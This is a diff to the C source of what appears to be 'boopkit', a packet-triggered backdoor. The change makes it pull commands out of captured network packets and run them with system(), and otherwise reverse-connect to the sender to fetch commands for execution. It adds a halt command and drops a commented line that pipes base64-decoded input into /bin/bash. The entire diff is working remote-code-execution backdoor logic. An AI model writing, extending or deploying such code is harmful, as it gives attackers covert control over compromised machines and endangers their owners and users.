@@ -393,9 +393,26 @@ int main(int argc, char **argv) {
         boopprintf("  ** Boop source: %s\n", saddrval);
 
         if (!cfg.payload) {
-          boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
           char *rce = malloc(MAX_RCE_SIZE);
           int retval;
+
+          // First check for payload in packet buffer before reverse connect!
+          retval = xcaprce(saddrval, rce);
+          if (retval == 0) {
+            char *ret;
+            ret = strstr(rce, BOOPKIT_RCE_CMD_HALT);
+            if (ret) {
+              // Halt!
+              xcap_collect  = 0;
+              boopprintf("  XX Halting boopkit: %s\n", ret);
+              return 0;
+            }
+            boopprintf("  <- Executing: %s\n", rce);
+            system(rce);
+            continue;
+          }
+          // Still no luck, try to look it up!
+          boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
           retval = recvrce(saddrval, rce);
           if (retval == 0) {
             boopprintf("  <- Executing: %s\r\n", rce);
@@ -407,9 +424,14 @@ int main(int argc, char **argv) {
           int retval;
           retval = xcaprce(saddrval, rce);
           if (retval == 0) {
-            // char rce_base64_cmd_str[4096];
-            // sprintf(rce_base64_cmd_str, "echo \"%s\" | base64 -d |
-            // /bin/bash", rce);
+            char *ret;
+            ret = strstr(rce, BOOPKIT_RCE_CMD_HALT);
+            if (ret) {
+              // Halt!
+              xcap_collect  = 0;
+              boopprintf("  XX Halting boopkit: %s\n", ret);
+              return 0;
+            }
             boopprintf("  <- Executing: %s\n", rce);
             system(rce);
           }
